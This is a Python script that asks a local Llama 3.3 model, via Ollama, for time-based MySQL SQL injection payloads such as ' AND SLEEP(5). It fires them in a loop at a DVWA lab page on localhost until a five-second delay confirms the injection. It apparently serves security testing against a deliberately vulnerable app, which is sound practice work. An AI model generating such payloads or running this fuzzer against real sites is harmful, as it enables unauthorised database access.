from ollama import chat
import requests
import time


"""
This file is working and will continue to loop through sql injection payloads till it finds one that sleeps 5 seconds.
Need to add more fuzz points. Works with DVWA low security (GET)
"""


def generate_sql_injection_payload(url_endpoint):
    # Prepare the prompt asking for a SQL injection payload
    sleep_variant = "' AND SLEEP(5)"
    prompt = f"Can you provide me a different sql injection like this {sleep_variant} payload for mysql in the 'id' parameter in the following URL: {url_endpoint}? Only return the payload, no other text or markdown please. Also can you url encode it."

    # Model Setup/Config
    messages = [
        {
            'role': 'tool',
            'content': prompt
        }
    ]

    response = chat(
        model="llama3.3",  
        messages=messages
    )

    payload = response['message']['content'] 
    return payload

def requester(url_endpoint):
    cookies = {
        'security':'low',
        'PHPSESSID':'581b25fa353038edda12bf865490647b'
    }
    try:
        r = requests.get(url_endpoint, cookies=cookies)
        return r
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    url_endpoint = "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"
    try:
        while True:
            sql_payload = generate_sql_injection_payload(url_endpoint)
            start_time = time.time()
            url_endpoint = f"http://localhost/vulnerabilities/sqli/?id=1{sql_payload}&Submit=Submit#"
            r = requester(url_endpoint)
            end_time = time.time()
            elapsed_time = end_time - start_time
            formatted_time = f"{elapsed_time:.2f}"
            print(f"{formatted_time} {url_endpoint}")
            if elapsed_time >= 5:
                break
        print(f"[+] SQL Injection Found! {url_endpoint}") 
            

    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")

if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"Runtime: {runtime:.2f}") # two decimal places
